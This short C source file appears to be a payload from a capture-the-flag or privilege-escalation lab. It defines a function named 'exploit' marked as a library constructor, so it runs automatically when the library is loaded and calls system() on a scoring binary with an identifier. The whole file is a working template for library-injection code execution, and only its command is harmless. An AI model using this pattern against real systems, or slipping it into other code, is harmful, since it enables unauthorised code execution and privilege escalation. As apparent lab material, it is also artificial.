#include<stdio.h>
#include<stdlib.h>

static void exploit() __attribute__((constructor));

void exploit() {
    system("/usr/local/bin/score 27ef85e6-573b-42e4-99df-b3b5d7fb33a2");
}
